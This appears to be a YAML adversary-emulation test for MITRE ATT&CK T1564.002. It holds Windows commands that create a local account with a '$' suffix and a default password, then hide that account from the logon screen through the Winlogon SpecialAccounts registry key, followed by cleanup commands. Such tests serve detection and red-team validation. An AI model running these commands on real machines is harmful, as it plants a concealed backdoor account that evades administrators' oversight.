api_version: "2.0"
name: Create Hidden User in Registry
description: |
    Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.
    Reference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
args:
    - name: user_password
      type: string
      default: At0micRedTeam!
    - name: user_name
      type: string
      default: AtomicOperator
uuid: 173126b7-afe4-45eb-8680-fa9f6400431c
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1564: Hide Artifacts'
    subtechniques:
        - 'T1564.002: Hidden Users'
requirements:
    platforms:
        - os: windows
steps:
    - name: create-hidden-user-in-registry
      inline: "NET USER {{.Args.user_name}}$ {{.Args.user_password}} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v {{.Args.user_name}}$ /t REG_DWORD /d 0\n"
      executor: command_prompt
      cleanup:
        inline: |
            reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v {{.Args.user_name}}$ /f >nul 2>&1
            net user ${user_name}$ /delete >nul 2>&1
        executor: command_prompt
